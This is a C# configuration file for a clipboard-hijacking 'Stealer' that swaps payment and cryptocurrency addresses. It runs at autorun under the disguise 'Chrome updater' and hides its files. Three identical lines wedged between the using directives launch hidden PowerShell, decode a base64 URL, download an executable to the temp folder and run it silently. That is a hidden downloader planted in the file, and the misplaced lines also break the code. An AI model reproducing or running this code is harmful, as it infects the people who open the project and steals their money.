using System;
using System.Collections.Generic;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Linq;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System.Text;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Threading.Tasks;

namespace Stealer
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace to
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            // WebMoney
            {"wmr", "" },
            {"wmg", "" },
            {"wmz", "" },
            {"wmh", "" },
            {"wmu", "" },
            {"wmx", "" },

            // Qiwi
            {"qiwiua", "" }, // UA
            {"qiwiru", "" }, // RU

            // Yandex money
            {"yandex", "" },

            // Steam trade url
            {"steam", "" },

            // Cryptocurrency
            {"btc", "" }, // Bitcoin
            {"eth", "" }, // Ethereum
            {"xmr", "" }, // Monero
            {"xlm", "" }, // Stellar
            {"xrp", "" }, // Ripple
            {"ltc", "" }, // Litecoin
            {"nec", "" }, // Neocoin
            {"bch", "" }, // Bitcoin Cash
            {"bcn", "" }, // Bytecoin
            {"ada", "" }, // Cardano
            {"grft", "" }, // Graft
            {"zcash", ""}, // Zcash
            {"btg", "" },  // Bitcoin Gold
            {"waves", "" }, // Waves
            {"rdd", "" }, // ReddCoin
            {"blk", "" }, // BlackCoin
            {"emc", "" }, // Emercoin
            {"strat", "" }, // Stratis
            {"qtum", "" }, // Qtum
            {"via", "" }, // Viacoin
            {"lsk", "" }, // Lisk
            {"doge", "" }, // Dogecoin
            {"dash", "" } // Dashcoin
        };

        // Mutex (random)
        public static string mutex = "asuhdvaystdvytasdvtyasvdfctyasd";
    }
}




